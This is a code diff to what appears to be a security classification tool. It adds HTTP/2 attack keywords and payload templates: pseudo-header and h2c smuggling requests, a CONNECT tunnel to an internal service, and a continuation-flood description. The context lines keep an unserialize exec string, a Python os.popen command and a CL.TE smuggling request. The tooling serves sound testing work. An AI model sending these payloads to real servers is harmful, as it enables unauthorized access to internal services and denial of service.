@@ -264,6 +264,10 @@ _CATEGORY_RULES: List[Tuple[str, List[str]]] = [
                          "pickle", "marshal", "yaml.load",
                          "insecure deserialization", "gadget chain",
                          "ysoserial", "phpggc"]),
+    ("http2", ["http/2", "h2c smuggling", "hpack", "hpack bomb",
+               "continuation flood", "rapid reset", "h2 desync",
+               "http2 smuggling", "pseudo-header", "stream reset",
+               "h2c upgrade", "cve-2023-44487", "cve-2024-27983"]),
     ("http_smuggling", ["request smuggling", "http smuggling",
                         "desync", "cl.te", "te.cl", "transfer-encoding",
                         "content-length", "http/2 smuggling",
@@ -436,6 +440,12 @@ _CVE_PAYLOAD_TEMPLATES: Dict[str, List[Dict]] = {
         {"tpl": 'O:8:"Exploit":1:{{s:4:"exec";s:2:"id";}}', "sub": "php_unserialize"},
         {"tpl": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==", "sub": "java_base64"},
         {"tpl": "__import__('os').popen('id').read()", "sub": "python_pickle"},
+    ],
+    "http2": [
+        {"tpl": ":method: GET\r\n:path: /admin\r\n:authority: internal.target.com\r\n:scheme: https", "sub": "pseudo_header_smuggling"},
+        {"tpl": "GET / HTTP/1.1\r\nHost: target\r\nUpgrade: h2c\r\nHTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA\r\nConnection: Upgrade, HTTP2-Settings", "sub": "h2c_smuggling"},
+        {"tpl": ":method: CONNECT\r\n:authority: internal-service:8080", "sub": "h2_connect_tunnel"},
+        {"tpl": "CONTINUATION frame flood: 10000 frames, each with 1 byte header fragment", "sub": "continuation_flood"},
     ],
     "http_smuggling": [
         {"tpl": "POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\n", "sub": "cl_te"},
